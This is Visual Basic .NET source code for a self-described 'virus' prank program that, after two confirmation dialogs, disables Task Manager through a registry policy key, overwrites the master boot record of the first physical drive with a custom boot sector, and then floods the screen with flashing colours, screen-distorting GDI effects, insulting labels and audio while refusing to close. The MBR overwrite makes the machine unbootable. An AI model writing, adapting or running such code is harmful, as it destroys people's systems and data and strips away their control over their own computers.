Imports System.Runtime.InteropServices
Imports Microsoft.Win32

Public Class Form1
    Dim words As String() = {"IDIOT", "NOOB", "FAILURE", "NOOOOOOB", "LOLLLL", "LOL", "EEERRRROOOOORRR", "IDIOT ALERT", "NEVER", "GONNA", "GIVE", "YOU", "UP"}
    Dim haha As Bitmap

    <DllImport("user32.dll")>
    Private Shared Function GetWindowDC(ByVal hWnd As IntPtr) As IntPtr
    End Function
    <DllImport("user32.dll")>
    Private Shared Function GetDesktopWindow() As IntPtr
    End Function
    <DllImport("gdi32.dll")>
    Private Shared Function StretchBlt(ByVal hdcDest As IntPtr, ByVal nXOriginDest As Integer, ByVal nYOriginDest As Integer, ByVal nWidthDest As Integer, ByVal nHeightDest As Integer, ByVal hdcSrc As IntPtr, ByVal nXOriginSrc As Integer, ByVal nYOriginSrc As Integer, ByVal nWidthSrc As Integer, ByVal nHeightSrc As Integer, ByVal dwRop As TernaryRasterOperations) As Boolean
    End Function
    <DllImport("gdi32.dll")>
    Private Shared Function BitBlt(ByVal hdc As IntPtr, ByVal nXDest As Integer, ByVal nYDest As Integer, ByVal nWidth As Integer, ByVal nHeight As Integer, ByVal hdcSrc As IntPtr, ByVal nXSrc As Integer, ByVal nYSrc As Integer, ByVal dwRop As TernaryRasterOperations) As Boolean
    End Function

    <DllImport("kernel32")>
    Private Shared Function CreateFile(ByVal lpFileName As String, ByVal dwDesiredAccess As UInteger, ByVal dwShareMode As UInteger, ByVal lpSecurityAttributes As IntPtr, ByVal dwCreationDisposition As UInteger, ByVal dwFlagsAndAttributes As UInteger, ByVal hTemplateFile As IntPtr) As IntPtr
    End Function

    <DllImport("kernel32")>
    Private Shared Function WriteFile(ByVal hFile As IntPtr, ByVal lpBuffer As Byte(), ByVal nNumberOfBytesToWrite As UInteger, <Out> ByRef lpNumberOfBytesWritten As UInteger, ByVal lpOverlapped As IntPtr) As Boolean
    End Function
    Public Enum TernaryRasterOperations
        SRCCOPY = &HCC0020
        SRCPAINT = &HEE0086
        SRCAND = &H8800C6
        SRCINVERT = &H660046
        SRCERASE = &H440328
        NOTSRCCOPY = &H330008
        NOTSRCERASE = &H1100A6
        MERGECOPY = &HC000CA
        MERGEPAINT = &HBB0226
        PATCOPY = &HF00021
        PATPAINT = &HFB0A09
        PATINVERT = &H5A0049
        DSTINVERT = &H550009
        BLACKNESS = &H42
        WHITENESS = &HFF0062
        CAPTUREBLT = &H40000000
    End Enum

    Private Const GenericWrite As UInteger = &H40000000
    Private Const GenericExecute As UInteger = &H20000000
    Private Const GenericAll As UInteger = &H10000000
    Private Const FileShareRead As UInteger = &H1
    Private Const FileShareWrite As UInteger = &H2
    Private Const OpenExisting As UInteger = &H3
    Private Const FileFlagDeleteOnClose As UInteger = &H4000000
    Private Const MbrSize As UInteger = 512UI
    <DllImport("user32.dll", EntryPoint:="GetWindowLong")> Public Shared Function GetWindowLong(ByVal hWnd As IntPtr, ByVal nIndex As Integer) As Integer
    End Function

    <DllImport("user32.dll", EntryPoint:="SetWindowLong")> Public Shared Function SetWindowLong(ByVal hWnd As IntPtr, ByVal nIndex As Integer, ByVal dwNewLong As Integer) As Integer
    End Function

    <DllImport("user32.dll", EntryPoint:="SetLayeredWindowAttributes")> Public Shared Function SetLayeredWindowAttributes(ByVal hWnd As IntPtr, ByVal crKey As Integer, ByVal alpha As Byte, ByVal dwFlags As Integer) As Boolean
    End Function
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.BackColor = Color.FromArgb(New Random().Next(1, 256), New Random().Next(1, 256), New Random().Next(1, 256))
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Timer1.Stop()
        Dim InitialStyle = GetWindowLong(Me.Handle, -20)
        Me.BackgroundImage = haha
        Me.BackgroundImageLayout = ImageLayout.Stretch
        SetWindowLong(Me.Handle, -20, InitialStyle Or &H80000 Or &H20)

        SetLayeredWindowAttributes(Me.Handle, 0, 255, &H2)
        Me.TopMost = True
        Timer3.Start()
        Timer4.Start()
        Timer2.Stop()
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim answer = MsgBox("This virus contains flashing lights (: do you still want to continue???", MsgBoxStyle.YesNo)
        If answer = MsgBoxResult.Yes Then
            Dim answer2 = MsgBox("I AM NOT REPONSIBLE FOR ANY DAMAGE! CONTINUE?", MsgBoxStyle.YesNo)
            If answer2 = MsgBoxResult.Yes Then
                IO.File.WriteAllText("C:\lmaoeedeed4654.bit", "Your computer is bricked now, whatever you do, do NOT restart. :D")
                Me.TopMost = True
                Dim systemRegistry As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
                systemRegistry.SetValue("DisableTaskMgr", 1)
                systemRegistry.Close()
                Timer12.Start()
                Dim lpNumberOfBytesWritten As UInteger = Nothing

                Try
                    Dim mbrData As Byte() = New Byte() {&HEB, &H0, &H8C, &HC8, &H8E, &HD8, &HBE, &H21, &H7C, &HE8, &H0, &H0, &H50, &HFC, &H8A, &H4, &H3C, &H0, &H74, &H6, &HE8, &H5, &H0, &H46, &HEB, &HF4, &HEB, &HFE, &HB4, &HE, &HCD, &H10, &HC3, &H41, &H6E, &H64, &H20, &H6F, &H6E, &H63, &H65, &H20, &H74, &H68, &H65, &H20, &H63, &H6F, &H6D, &H70, &H75, &H74, &H65, &H72, &H20, &H72, &H65, &H62, &H6F, &H6F, &H74, &H73, &H2C, &H20, &H53, &H79, &H73, &H74, &H65, &H6D, &H70, &H20, &H68, &H61, &H73, &H20, &H62, &H65, &H65, &H6E, &H20, &H69, &H6E, &H69, &H74, &H69, &H61, &H74, &H65, &H64, &H2E, &H20, &H4D, &H61, &H64, &H65, &H20, &H77, &H69, &H74, &H68, &H20, &H3C, &H33, &H20, &H62, &H79, &H20, &H49, &H6D, &H75, &H73, &H69, &H6E, &H67, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H0, &H55, &HAA}
                    If Not (mbrData.Length = 512) Then Return
                    Dim mbr = CreateFile("\\.\PhysicalDrive0", GenericAll, FileShareRead Or FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero)

                    If mbr = CType((-&H1), IntPtr) Then
                        Application.[Exit]()
                    End If

                    If WriteFile(mbr, mbrData, MbrSize, lpNumberOfBytesWritten, IntPtr.Zero) Then
                    Else
                        Application.[Exit]()
                    End If

                Catch __unusedException1__ As Exception
                End Try
                Process.Start("notepad.exe", "C:\lmaoeedeed4654.bit")
            Else
                Application.Exit()
            End If
        Else
            Application.Exit()
        End If
    End Sub
    Private Function Take() As Bitmap
        Try
            Dim screenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)

            Dim screenGrab As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)

            Dim g As Graphics = Graphics.FromImage(screenGrab)

            g.CopyFromScreen(New Point(0, 0), New Point(0, 0), screenSize)

            Return screenGrab
        Catch
        End Try
    End Function

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Dim c As New Panel
        c.Location = New Point(New Random().Next(1, My.Computer.Screen.Bounds.Width), New Random().Next(1, My.Computer.Screen.Bounds.Height))
        c.BackColor = Color.FromArgb(New Random().Next(1, 256), New Random().Next(1, 256), New Random().Next(1, 256))
        c.Parent = Me
        c.Show()
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Timer3.Stop()
        Me.BackgroundImage = Nothing
        Timer5.Start()
        Timer6.Start()
        Timer7.Start()
        Timer4.Stop()
    End Sub

    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
        Me.WindowState = FormWindowState.Minimized
        haha = Take()
        Me.WindowState = FormWindowState.Maximized
        Me.BackgroundImage = haha
        Me.BackgroundImageLayout = ImageLayout.Stretch

    End Sub

    Private Sub Timer6_Tick(sender As Object, e As EventArgs) Handles Timer6.Tick
        Dim c As New Label
        c.Text = words(New Random().Next(1, words.Length - 1))
        c.BackColor = Color.FromArgb(New Random().Next(1, 256), New Random().Next(1, 256), New Random().Next(1, 256))
        c.ForeColor = Color.Red
        c.AutoSize = True
        c.Location = New Point(New Random().Next(1, 900), New Random().Next(1, 900))
        c.Parent = Me
        If Timer6.Interval > 1 Then
            Timer6.Interval -= 1
        End If
        c.Show()
    End Sub

    Private Sub Timer7_Tick(sender As Object, e As EventArgs) Handles Timer7.Tick
        Timer6.Stop()
        Timer10.Start()
        Timer9.Start()
        Timer7.Stop()
    End Sub

    Private Sub Timer9_Tick(sender As Object, e As EventArgs) Handles Timer9.Tick
        Dim c As New deez
        c.Location = New Point(New Random().Next(1, 900), New Random().Next(1, 900))
        c.Show()
    End Sub

    Private Sub Timer8_Tick(sender As Object, e As EventArgs) Handles Timer8.Tick
        My.Computer.Audio.Play(My.Resources.bumboom, AudioPlayMode.BackgroundLoop)
        Timer8.Stop()
    End Sub

    Private Sub Timer10_Tick(sender As Object, e As EventArgs) Handles Timer10.Tick
        Dim hwnd As IntPtr = GetDesktopWindow()
        Dim hdc As IntPtr = GetWindowDC(hwnd)
        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
        StretchBlt(hdc, 25, 25, x - 50, y - 50, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY)
    End Sub

    Private Sub Timer11_Tick(sender As Object, e As EventArgs) Handles Timer11.Tick
        Timer11.Interval = 10
        Dim rnd1 As New Random
        Dim ne1 = rnd1.Next(1, My.Computer.Screen.Bounds.Width)
        Dim rnd2 As New Random
        Dim ne2 = rnd2.Next(1, My.Computer.Screen.Bounds.Height)
        Dim c As New Label
        c.Text = words(New Random().Next(1, words.Length - 1))
        c.BackColor = Color.FromArgb(New Random().Next(1, 256), New Random().Next(1, 256), New Random().Next(1, 256))
        c.ForeColor = Color.Red
        c.AutoSize = True
        c.Location = New Point(ne1, ne2)
        c.Parent = Me
        c.Show()
        Timer11.Start()
    End Sub

    Private Sub Timer12_Tick(sender As Object, e As EventArgs) Handles Timer12.Tick
        My.Computer.Audio.Play(My.Resources.skrrillic, AudioPlayMode.Background)
        Timer1.Start()
        Timer2.Start()
        Timer8.Start()
        Timer13.Start()
        Me.WindowState = FormWindowState.Minimized
        haha = Take()
        Timer11.Start()
        Me.WindowState = FormWindowState.Maximized
        Timer12.Stop()
    End Sub

    Private Sub Timer13_Tick(sender As Object, e As EventArgs) Handles Timer13.Tick
        Timer13.Interval = 100
        Dim hwnd As IntPtr = GetDesktopWindow()
        Dim hdc As IntPtr = GetWindowDC(hwnd)
        Dim x As Integer = Screen.PrimaryScreen.Bounds.Width
        Dim y As Integer = Screen.PrimaryScreen.Bounds.Height
        StretchBlt(hdc, 25, 25, x - 50, y - 50, hdc, 0, 0, x, y, TernaryRasterOperations.SRCCOPY)
        Timer13.Start()
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        e.Cancel = True
    End Sub
End Class
